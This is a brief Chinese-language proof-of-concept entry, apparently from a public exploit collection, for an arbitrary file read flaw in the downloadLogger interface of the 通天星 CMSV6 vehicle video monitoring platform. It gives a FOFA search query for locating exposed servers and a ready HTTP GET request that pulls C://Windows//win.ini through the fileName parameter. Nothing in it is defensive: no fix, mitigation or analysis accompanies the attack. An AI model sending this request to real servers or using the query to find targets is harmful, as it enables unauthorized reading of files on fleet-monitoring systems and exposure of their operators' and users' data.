## 通天星CMSV6车载视频监控平台downloadLogger接口任意文件读取漏洞

## fofa
```
body="./open/webApi.html"||body="/808gps/"
```


## poc
```
GET /808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini HTTP/1.1
Host:127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

![image](https://github.com/wy876/POC/assets/139549762/dd596d83-95b3-48de-abbb-74e7b3f47280)
